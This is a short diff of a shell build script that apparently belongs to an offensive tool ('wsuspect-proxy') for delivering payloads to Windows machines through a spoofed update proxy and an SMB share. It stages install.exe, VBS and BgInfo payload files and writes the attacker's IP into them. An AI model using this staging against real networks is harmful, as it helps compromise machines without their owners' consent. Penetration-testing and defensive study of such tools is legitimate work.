@@ -51,7 +51,7 @@ build () {
 	mkdir /tmp/payloads >/dev/null 2>&1
 	cp $BINARY_PATH /tmp/payloads/install.exe >/dev/null 2>&1
 	cp $SCRIPT_DIR/resources/smb.conf /etc/samba/.
-	sed s/TARGET_IP/$IPADDR/ < $SCRIPT_DIR/resources/script.bgi > /tmp/payloads/script.bgi
+	python $SCRIPT_DIR/resources/create_bgi.py
 	sed s/TARGET_IP/$IPADDR/ < $SCRIPT_DIR/resources/script.vbs > /tmp/payloads/script.vbs
 	sed s/TARGET_IP/$IPADDR/ < $SCRIPT_DIR/resources/payloads.ini > $SCRIPT_DIR/wsuspect-proxy/payloads/payloads.ini
         cp $SCRIPT_DIR/resources/BgInfo.exe $SCRIPT_DIR/wsuspect-proxy/payloads/.
